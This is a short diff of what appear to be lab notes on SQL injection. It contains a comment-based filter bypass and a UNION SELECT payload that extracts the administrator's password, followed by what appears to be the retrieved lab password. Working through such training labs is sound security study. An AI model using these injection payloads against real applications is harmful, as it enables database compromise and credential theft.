@@ -121,4 +121,4 @@ ANS : GET /filter?category=Gifts'--+
 
      - Find Password of user administrator
 
-      'UNION SELECT PASSWORD_KWSPKR,'ABC' FROM USERS_BYFICP WHERE USERNAME_SLTNDT=''
+      'UNION SELECT PASSWORD_KWSPKR,'ABC' FROM USERS_BYFICP WHERE USERNAME_SLTNDT='administrator' --+  : nvtzkic1pfd8yay6eptu
